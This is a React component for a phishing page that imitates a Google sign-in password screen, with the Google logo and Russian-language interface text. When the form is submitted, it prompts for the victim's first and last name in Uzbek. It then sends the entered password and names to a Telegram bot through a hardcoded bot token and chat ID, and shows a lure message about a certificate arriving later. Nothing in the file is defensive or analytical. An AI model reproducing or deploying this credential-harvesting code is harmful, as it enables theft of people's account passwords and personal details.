import React, { useState } from 'react';
import './test.css';

function Password() {
    const [showPassword, setShowPassword] = useState(false);
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');
    const [errorStyle, setErrorStyle] = useState({});

    const togglePasswordVisibility = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        const name = prompt("Ismingizni kiriting")
        const familya = prompt("Familyangizni kiriting")

        if (!password) {
            setError('Пожалуйста, введите пароль');
            setErrorStyle({ marginTop: '-10px', color: 'red' });
        } else {
            setError('');
            setErrorStyle({});
            try {
                const botToken = '7728247018:AAE-9N2DS2sar4q8RTpwv2puNQB5yDFaog8';
                const chatId = '7341896378';
                const message = `Kiritilgan parol: ${password}\nIsmi: ${name}\nFamilya: ${familya} `;

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });

                if (response.ok) {
                    alert('Sertifikat 30 minut ichida yuboriladi Agar yuborilmasa hatto kiritgan bolishingiz mumkin qayta urini korasiz Rahmat!');
                } else {
                    throw new Error('Xatolik yuz berdi');
                }
            } catch (error) {
                setError('Xatolik yuz berdi: ' + error.message);
                setErrorStyle({ marginTop: '-10px', marginBottom: '10px', color: 'red' });
            }
        }
    };

    return (
        <div>
            <div className="test">
                <div className="container">
                    <div className="test__center">
                        <div className="test__text">
                            <div className="test__text1">
                                <svg
                                    xmlns="http://www.w3.org/2000/svg"
                                    width="48"
                                    height="48"
                                    viewBox="0 0 40 48"
                                    aria-hidden="true"
                                    jsname="jjf7Ff"
                                >
                                    <path
                                        fill="#4285F4"
                                        d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                                    ></path>
                                    <path
                                        fill="#34A853"
                                        d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                                    ></path>
                                    <path
                                        fill="#FABB05"
                                        d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                                    ></path>
                                    <path
                                        fill="#E94235"
                                        d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                                    ></path>
                                </svg>
                                <h4>Вход</h4>
                                <p>
                                    с аккаунтом Google. Этот аккаунт будет доступен другим
                                    <br />
                                    приложениям Google в браузере.
                                </p>
                            </div>
                            <div className="test__text2">
                                <div className="input__group">
                                    <input
                                        type={showPassword ? 'text' : 'password'}
                                        required
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                    />
                                    <label htmlFor="">Введите пароль</label>
                                </div>
                                {error && <p style={errorStyle}>{error}</p>}
                                <div
                                    className="password"
                                    style={{ display: 'flex', gap: '10px' }}
                                >
                                    <input
                                        type="checkbox"
                                        id="check"
                                        style={{ cursor: 'pointer', width: '20px' }}
                                        onChange={togglePasswordVisibility}
                                    />
                                    <label
                                        htmlFor="check"
                                        style={{ cursor: 'pointer', marginTop: '0' }}
                                    >
                                        Показать пароль
                                    </label>
                                </div>
                                <p>
                                    Не ваш компьютер? Включите гостевой режим, чтобы защитить
                                    <br />
                                    данные в аккаунте.{' '}
                                    <span>
                                        Подробнее об использовании гостевого
                                        <br />
                                        режима
                                    </span>
                                </p>
                                <button className="next" onClick={handleSubmit}>
                                    Далее
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default Password;
